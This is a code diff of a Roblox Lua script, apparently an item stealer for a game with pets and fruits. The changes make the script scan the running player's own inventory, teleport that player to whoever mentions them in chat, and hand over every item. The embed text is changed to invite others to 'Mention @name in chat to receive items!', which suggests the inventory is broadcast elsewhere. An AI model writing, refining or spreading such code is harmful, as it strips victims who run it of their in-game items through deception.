@@ -117,7 +117,7 @@ local function sendMyInventory()
     
     local embed = {
         title = "📦 "..LocalPlayer.Name.."'s Inventory",
-        description = "Execute this script to join:",
+        description = "Mention @"..LocalPlayer.Name.." in chat to receive items!",
         color = 0x00FF00,
         fields = {
             {
@@ -168,8 +168,8 @@ local function sendMyInventory()
     end
 end
 
--- Collect items from player who mentioned me
-local function collectFromMentioner(mentionerPlayer)
+-- Give MY items to mentioning player
+local function giveItemsToMentioner(mentionerPlayer)
     local targetChar = mentionerPlayer.Character or mentionerPlayer.CharacterAdded:Wait()
     local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoid = myChar:FindFirstChildOfClass("Humanoid")
@@ -184,8 +184,8 @@ local function collectFromMentioner(mentionerPlayer)
     humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
 
-    -- Get their sorted inventory
-    local pets, fruits = scanInventory(mentionerPlayer)
+    -- Get MY sorted inventory
+    local pets, fruits = scanInventory(LocalPlayer)
     local allItems = {}
     
     -- Add pets first
@@ -206,7 +206,7 @@ local function collectFromMentioner(mentionerPlayer)
         monitorToolRemoval()
         task.wait(0.5)
         
-        -- Click and hold until item disappears
+        -- Click and hold until item disappears from MY inventory
         local viewport = Camera.ViewportSize
         local center = Vector2.new(viewport.X/2, viewport.Y/2)
         
@@ -242,7 +242,7 @@ local function onPlayerChatted(player, message)
     end
     
     print("📢 Mention detected from", player.Name)
-    collectFromMentioner(player)
+    giveItemsToMentioner(player)
 end
 
 -- Initialize
@@ -269,7 +269,7 @@ local function main()
         end)
     end)
     
-    print("✅ Inventory Collector Active! Waiting for mentions...")
+    print("✅ Item Giver Active! Waiting for mentions...")
 end
 
 -- Start with retry
